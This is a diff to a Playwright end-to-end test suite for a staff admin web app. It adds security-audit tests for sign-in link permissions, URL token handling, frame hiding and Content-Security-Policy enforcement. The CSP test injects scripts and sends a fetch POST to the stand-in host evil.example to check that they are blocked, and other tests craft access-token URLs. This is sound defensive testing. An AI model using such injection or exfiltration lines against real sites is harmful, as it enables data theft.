@@ -3,6 +3,7 @@
 // the staff-admin function (with the function's own rules module).
 // Run: npx http-server -p 8080 -s . &  then  node tests/team-e2e.mjs [outDir]
 import { chromium } from 'playwright';
+import { watchCsp, noCspViolations, cspViolations } from './csp-watch.mjs';
 import assert from 'node:assert/strict';
 import { randomUUID, randomBytes } from 'node:crypto';
 import {
@@ -187,6 +188,7 @@ async function newPage(viewport = { width: 1280, height: 900 }) {
   await ctx.route('https://czncjzziqrqtezpwxxpz.supabase.co/**', withClientColumns(fakeSupabase, CLIENT_SHAPE));
   const page = await ctx.newPage();
   page.on('pageerror', (e) => errors.push(String(e)));
+  watchCsp(page); // a load the Content-Security-Policy refused fails the suite (tests/csp-watch.mjs)
   page.on('console', (msg) => { if (msg.type() === 'error' && !/Failed to load resource/.test(msg.text())) errors.push(msg.text()); });
   page.on('dialog', (d) => d.accept());
   return page;
@@ -376,9 +378,20 @@ await step('Irit manages the team without the owner\'s powers', async () => {
   assert.equal(await irit.locator('#mklink-owner').count(), 0, 'no link for the owner');
   assert.equal(await text(irit, '#ownerlink-owner'), 'רק הבעלים יוצר קישור כניסה לחשבון הזה.');
   assert.match(await text(irit, '#row-irit'), /זה אני/);
-  await irit.click('#mklink-ofir');
-  await irit.waitForSelector('#link-ofir');
-  assert.match(await irit.inputValue('#link-ofir'), /#type=recovery&token_hash=/);
+  // Security audit, 6.10.2026 (ops.md, section 36): Irit has the vault, and still makes
+  // no sign-in link into an office account or a vault account (Ofir, Lior), on the
+  // screen or straight at the function. Her own, and an editor's, as before.
+  for (const who of ['ofir', 'lior']) {
+    assert.equal(await irit.locator(`#mklink-${who}`).count(), 0, who);
+    assert.equal(await text(irit, `#ownerlink-${who}`), 'רק הבעלים יוצר קישור כניסה לחשבון הזה.');
+    assert.deepEqual(staffAdmin(users.get('irit@astrateg.test'), { action: 'link', email: `${who}@astrateg.test`, redirectTo: `${BASE}clients.html` }),
+      [403, { error: 'owner_only' }], who);
+  }
+  assert.equal(await irit.locator('#mklink-irit').count(), 1, 'her own');
+  assert.equal(await irit.locator('#ownerlink-irit').count(), 0);
+  await irit.click('#mklink-yariv');
+  await irit.waitForSelector('#link-yariv');
+  assert.match(await irit.inputValue('#link-yariv'), /#type=recovery&token_hash=/);
   assert.equal(fnCalls.at(-1).by, 'irit@astrateg.test');
   await irit.fill('#email-nadia', 'nadia2@astrateg.test');
   await irit.click('#save-nadia');
@@ -451,7 +464,7 @@ await step('a payouts owner\'s login gets a link from the owner only', async () 
   assert.match(await owner.inputValue('#link-anna'), /#type=recovery&token_hash=/);
 });
 
-await step('without the vault, Lior gets no link into an account that has it', async () => {
+await step('Lior, with or without the vault, gets no link into an office or vault account', async () => {
   await owner.click('#vault-lior');
   await owner.waitForSelector('#vault-lior[aria-pressed="false"]');
   const lior = await newPage();
@@ -465,7 +478,16 @@ await step('without the vault, Lior gets no link into an account that has it', a
   assert.equal(await lior.locator('#mklink-lior').count(), 1, 'their own');
   const redirectTo = `${BASE}clients.html`;
   assert.deepEqual(staffAdmin(users.get('lior@astrateg.test'), { action: 'link', email: 'ofir@astrateg.test', redirectTo }), [403, { error: 'owner_only' }]);
-  assert.equal(staffAdmin(users.get('irit@astrateg.test'), { action: 'link', email: 'ofir@astrateg.test', redirectTo })[0], 200, 'Irit still has the vault');
+  assert.equal(staffAdmin(users.get('irit@astrateg.test'), { action: 'link', email: 'ofir@astrateg.test', redirectTo })[0], 403, 'Irit has the vault, and still none');
+  // A row with no login yet (an invite): the same rule. Ilai's row is added by the owner.
+  assert.equal(staffAdmin(users.get('owner@astrateg.test'), { action: 'upsert', mode: 'add', email: 'ilai-new@astrateg.test', person: 'ilai' })[0], 200);
+  assert.equal(users.has('ilai-new@astrateg.test'), false, 'no login yet');
+  assert.deepEqual(staffAdmin(users.get('irit@astrateg.test'), { action: 'link', email: 'ilai-new@astrateg.test', redirectTo }), [403, { error: 'owner_only' }]);
+  await lior.click('#btn-refresh');
+  await lior.waitForSelector('#ownerlink-ilai');
+  assert.equal(await lior.locator('#mklink-ilai').count(), 0, 'no invite button for an office row');
+  const made = staffAdmin(users.get('owner@astrateg.test'), { action: 'link', email: 'ilai-new@astrateg.test', redirectTo });
+  assert.deepEqual([made[0], made[1].type], [200, 'invite']);
 });
 
 // ── An editor ─────────────────────────────
@@ -554,6 +576,127 @@ await step('a used or expired link explains what to do', async () => {
   assert.equal(await x.evaluate(() => location.hash), '');
 });
 
+// Security audit, 6.10.2026 (ops.md 36): an address that carries a pair of tokens signs
+// its opener in as that account. It used to work for any `type`, and to replace
+// whoever was signed in on the device without a word.
+await step('a pair of tokens that is not a reset link signs nobody in', async () => {
+  const ofir = users.get('ofir@astrateg.test');
+  for (const type of ['magiclink', 'signup', 'invite', '']) {
+    const p = await newPage();
+    await p.goto(`${BASE}clients.html#access_token=${jwtFor(ofir)}&refresh_token=r&expires_in=3600&token_type=bearer${type ? `&type=${type}` : ''}`);
+    await p.waitForSelector('#lg-err:not([hidden])');
+    assert.match(await text(p, '#lg-err'), /הקישור כבר לא תקף/, type);
+    assert.equal(await p.locator('#app').isHidden(), true, type);
+    assert.equal(await p.locator('#sp-form').count(), 0, type);
+    assert.equal(await p.evaluate(() => location.hash), '', 'the tokens are removed from the address bar');
+    assert.equal(await p.evaluate(() => Object.keys(localStorage).filter((k) => /auth-token/.test(k)).length), 0, `${type}: no session was stored`);
+    await p.close();
+  }
+});
+
+await step('a link of another account does not replace the one signed in here without asking', async () => {
+  const ofir = users.get('ofir@astrateg.test');
+  const y = await newPage();
+  await signIn(y, 'clients.html', 'yariv@astrateg.test');
+  assert.equal(await text(y, '#session-who'), 'yariv@astrateg.test');
+  const asked = [];
+  let answer = false;
+  y.removeAllListeners('dialog'); // newPage() accepts every dialog
+  y.on('dialog', (d) => { asked.push(d.message()); return answer ? d.accept() : d.dismiss(); });
+  const other = `${BASE}clients.html#access_token=${jwtFor(ofir)}&refresh_token=r&expires_in=3600&token_type=bearer&type=recovery`;
+  // "ביטול": he stays signed in as himself, and the link is not spent.
+  await y.goto(`${BASE}team.html`);
+  await y.goto(other);
+  await y.waitForSelector('#app:not([hidden])');
+  await toastHas(y, 'נשארת בחשבון המחובר. הקישור לא נוצל.');
+  assert.equal(asked.length, 1);
+  assert.match(asked[0], /הקישור שייך לחשבון אחר \(ofir@astrateg\.test\)\.\nבמכשיר הזה מחובר כרגע yariv@astrateg\.test\./);
+  assert.match(asked[0], /אישור: לעבור לחשבון של הקישור\.\nביטול: להישאר בחשבון המחובר/);
+  assert.equal(await text(y, '#session-who'), 'yariv@astrateg.test');
+  assert.equal(await y.locator('#sp-form').count(), 0);
+  assert.doesNotMatch(await y.evaluate(() => location.hash), /access_token|token_hash/, 'the tokens left the address bar');
+  // His own reset link: nothing to ask.
+  await y.goto(`${BASE}team.html`);
+  await y.goto(`${BASE}clients.html#access_token=${jwtFor(users.get('yariv@astrateg.test'))}&refresh_token=r&expires_in=3600&token_type=bearer&type=recovery`);
+  await y.waitForSelector('#sp-form');
+  assert.equal(asked.length, 1, 'the same account: no question');
+  // A personal link from the team screen (its account is not known before it is spent): asked too.
+  const made = staffAdmin(users.get('owner@astrateg.test'), { action: 'link', email: 'yariv@astrateg.test', redirectTo: `${BASE}clients.html` })[1].link;
+  await y.goto(`${BASE}team.html`);
+  await y.goto(made);
+  await y.waitForSelector('#app:not([hidden])');
+  await toastHas(y, 'נשארת בחשבון המחובר');
+  assert.equal(asked.length, 2);
+  assert.match(asked[1], /זה קישור כניסה אישי, והוא עשוי להיות של חשבון אחר\.\nבמכשיר הזה מחובר כרגע yariv@astrateg\.test\./);
+  assert.equal([...tokens.values()].at(-1).used, false, 'not spent');
+  // "אישור": the explicit choice moves to the link's account, which then chooses a password.
+  answer = true;
+  await y.goto(`${BASE}team.html`);
+  await y.goto(other);
+  await y.waitForSelector('#sp-form');
+  assert.equal(asked.length, 3);
+  assert.equal(await text(y, '#sp-h'), 'בחירת סיסמה חדשה');
+});
+
+// Security audit, 6.10.2026 (ops.md 36): GitHub Pages cannot forbid framing with a header,
+// so a page shown inside another site's frame hides itself (app/frame-guard.js).
+await step('inside another site\'s frame a page hides itself; on its own it shows', async () => {
+  const ctx = await browser.newContext({ locale: 'he-IL' });
+  await ctx.route('https://czncjzziqrqtezpwxxpz.supabase.co/**', withClientColumns(fakeSupabase, CLIENT_SHAPE));
+  // Another origin on this machine stands in for the other site (the browser lets no far
+  // site frame localhost at all): the same server by its number, a file with no policy of its own.
+  const p = await ctx.newPage();
+  await p.goto(`http://127.0.0.1:${new URL(BASE).port}/package.json`);
+  assert.notEqual(new URL(p.url()).origin, new URL(BASE).origin);
+  await p.evaluate((pages) => {
+    for (const [id, src] of pages) { const f = document.createElement('iframe'); Object.assign(f, { id, src, width: 800, height: 600 }); document.body.append(f); }
+  }, [['f', `${BASE}clients.html`], ['g', `${BASE}q.html#t=x`]]);
+  for (const name of ['clients.html', 'q.html']) {
+    await p.waitForFunction((n) => [...document.querySelectorAll('iframe')].every((f) => f.contentWindow) && !!n, name);
+    let frame = null;
+    for (let i = 0; i < 50 && !frame; i += 1) { frame = p.frames().find((f) => f.url().includes(name)) || null; if (!frame) await p.waitForTimeout(100); }
+    assert.ok(frame, `${name}: the frame loaded`);
+    await frame.waitForLoadState('domcontentloaded');
+    const seen = await frame.evaluate(() => ({ display: getComputedStyle(document.documentElement).display, framed: document.documentElement.hasAttribute('data-framed') }));
+    assert.deepEqual(seen, { display: 'none', framed: true }, name);
+  }
+  // The frame takes no room for a press: nothing of the page is drawn in it.
+  assert.equal(await p.frameLocator('#f').locator('#lg-submit').isVisible(), false);
+  // On its own, the same page is there.
+  const own = await ctx.newPage();
+  await own.goto(`${BASE}clients.html`);
+  await own.waitForSelector('#lg-submit');
+  assert.deepEqual(await own.evaluate(() => ({ display: getComputedStyle(document.documentElement).display, framed: document.documentElement.hasAttribute('data-framed') })), { display: 'block', framed: false });
+  await ctx.close();
+});
+
+// The policy itself, and that a refusal is heard: every suite ends with noCspViolations(),
+// so a page that needs something the policy refuses fails its suite.
+await step('the policy refuses a script, a picture and a request to another site, and code written into the page; the suites hear it', async () => {
+  const p = await newPage();
+  await p.goto(`${BASE}clients.html`);
+  await p.waitForSelector('#lg-submit');
+  const heard = cspViolations.length;
+  const said = errors.length;
+  const got = await p.evaluate(() => new Promise((resolve) => {
+    const seen = [];
+    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective.split(' ')[0]));
+    new Image().src = 'https://evil.example/x.png';
+    const far = document.createElement('script'); far.src = 'https://evil.example/x.js'; document.head.append(far);
+    const inline = document.createElement('script'); inline.textContent = 'window.__ran = 1'; document.head.append(inline);
+    fetch('https://evil.example/collect', { method: 'POST', body: 'x' }).catch(() => {});
+    const frame = document.createElement('iframe'); frame.src = 'https://evil.example/'; document.body.append(frame);
+    setTimeout(() => resolve({ seen: [...new Set(seen)].sort(), ran: window.__ran === 1 }), 600);
+  }));
+  assert.deepEqual(got, { seen: ['connect-src', 'frame-src', 'img-src', 'script-src-elem'], ran: false });
+  assert.ok(cspViolations.length >= heard + 4, `the watch heard ${cspViolations.length - heard} refusals`);
+  // These refusals were asked for: they are not the suite's.
+  cspViolations.length = heard;
+  errors.length = said;
+  await p.close();
+});
+
 await browser.close();
+noCspViolations();
 assert.deepEqual(errors, []);
 console.log(`team-e2e: ${passed} passed`);
